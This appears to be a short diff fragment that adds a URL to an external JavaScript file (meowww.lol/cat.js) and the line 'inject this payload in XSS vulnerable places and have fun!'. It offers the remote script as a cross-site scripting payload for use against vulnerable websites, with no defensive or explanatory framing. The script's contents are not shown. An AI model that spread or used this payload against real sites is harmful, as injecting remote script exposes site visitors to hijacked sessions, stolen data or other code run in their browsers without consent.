@@ -1,0 +1,3 @@
+ 
+ https://meowww.lol/cat.js
+ inject this payload in XSS vulnerable places and have fun!
